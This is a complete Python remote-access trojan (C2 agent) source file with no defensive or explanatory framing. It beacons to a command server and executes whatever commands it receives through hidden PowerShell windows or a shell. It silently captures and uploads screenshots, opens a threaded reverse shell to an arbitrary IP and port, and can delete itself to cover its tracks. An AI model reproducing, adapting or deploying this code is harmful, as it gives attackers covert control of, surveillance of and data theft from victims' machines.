#!/usr/bin/env python3
import requests
import subprocess
import time
import uuid
import socket
import os
import argparse
import sys
import platform
import threading

class Agent:
    def __init__(self, server_url, interval):
        self.server_url = server_url.rstrip('/')
        self.interval = interval
        self.id = self.get_id()
        self.os = f"{platform.system()} {platform.release()}"
        
    def get_id(self):
        id_file = ".agent_id"
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        else:
            agent_id = f"{socket.gethostname()}_{uuid.uuid4().hex[:8]}"
            with open(id_file, 'w') as f:
                f.write(agent_id)
            return agent_id
    
    def _capture_screen(self):
        temp_file = "s.png"
        try:
            if platform.system() == "Windows":
                ps_cmd = '[Reflection.Assembly]::LoadWithPartialName("System.Drawing"); [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0, $b.Size); $b.Save("s.png", [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $b.Dispose()'
                subprocess.run(["powershell", "-WindowStyle", "Hidden", "-c", ps_cmd], capture_output=True, creationflags=0x08000000)
            elif platform.system() == "Darwin":
                subprocess.run(["screencapture", "-x", temp_file], capture_output=True)
            else:
                subprocess.run(["import", "-window", "root", temp_file], capture_output=True)
            
            if os.path.exists(temp_file):
                with open(temp_file, 'rb') as f:
                    requests.post(f"{self.server_url}/api/p/report/screenshot", 
                                 files={'file': f}, data={'agent_id': self.id}, timeout=30)
                os.remove(temp_file)
                return "[+] Screenshot captured and uploaded via legacy handler."
            return "[!] Screenshot failed."
        except Exception as e:
            return f"[!] Screenshot error: {str(e)}"

    def _reverse_shell(self, ip, port):
        def _connect():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                while True:
                    s.send(f"[{os.getcwd()}] $ ".encode())
                    data = s.recv(1024).decode().strip()
                    if data == "exit": break
                    if data.startswith("cd "):
                        try: os.chdir(data[3:].strip())
                        except: pass
                        continue
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    s.send(output)
                s.close()
            except: pass
        threading.Thread(target=_connect, daemon=True).start()
        return f"[+] Reverse shell initiated to {ip}:{port}"

    def _selfdestruct(self):
        try:
            my_file = os.path.abspath(__file__)
            if platform.system() == "Windows":
                subprocess.Popen(f'cmd /c "timeout /t 2 /nobreak >nul & del /f /q \"{my_file}\""', shell=True, creationflags=0x08000000)
            else:
                subprocess.Popen(f'sleep 2 && rm -f "{my_file}"', shell=True)
            os._exit(0)
        except: os._exit(1)

    def execute(self, command, task_id=None):
        try:
            # Command processing
            low = command.lower()
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"[+] CWD: {os.getcwd()}"
            
            if low == "@screenshot": return self._capture_screen()
            if low.startswith("@revshell"):
                p = command.split()
                if len(p) < 3: return "[!] Usage: @revshell <ip> <port>"
                return self._reverse_shell(p[1], p[2])
            
            if low == "@selfdestruct": self._selfdestruct()
            
            if low.startswith("@ls"):
                path = command[3:].strip() or "."
                try: return "\n".join(os.listdir(path))
                except Exception as e: return str(e)

            # System execution
            if command.startswith("@"): command = command[1:]
            
            if platform.system() == "Windows":
                res = subprocess.run(["powershell", "-W", "Hidden", "-c", command], capture_output=True, text=True, timeout=60, creationflags=0x08000000)
            else:
                res = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
                
            out = (res.stdout + res.stderr).strip()
            return out if out else "[+] Executed (No output)"
        except Exception as e:
            return f"[!] Error: {str(e)}"
    
    def run(self):
        print(f"[*] Agent {self.id} Active. Server: {self.server_url}")
        while True:
            try:
                resp = requests.post(f"{self.server_url}/beacon", 
                                   json={'agent_id': self.id, 'os': self.os, 'hostname': socket.gethostname()}, 
                                   timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if 'command' in data:
                        tid = data.get('command_id')
                        out = self.execute(data['command'], task_id=tid)
                        requests.post(f"{self.server_url}/result", 
                                    json={'command_id': tid, 'output': out, 'agent_id': self.id}, timeout=10)
                time.sleep(self.interval)
            except KeyboardInterrupt: break
            except: time.sleep(self.interval)

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument("--server", default="http://localhost:5001")
    p.add_argument("--interval", type=int, default=10)
    args = p.parse_args()
    Agent(args.server, args.interval).run()